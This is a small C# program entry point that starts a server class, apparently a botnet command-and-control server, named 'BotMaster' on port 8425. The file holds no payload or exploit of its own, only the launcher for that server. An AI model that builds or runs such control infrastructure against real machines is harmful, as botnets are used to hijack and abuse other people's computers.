using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Server.CnC_CLI
{
    public class Program
    {
        static void Main(string[] args)
        {
            // Start the server on port 8425
            CnC_Server.Server BotMaster = new CnC_Server.Server(8425);
            BotMaster.Start();
        }
    }
}
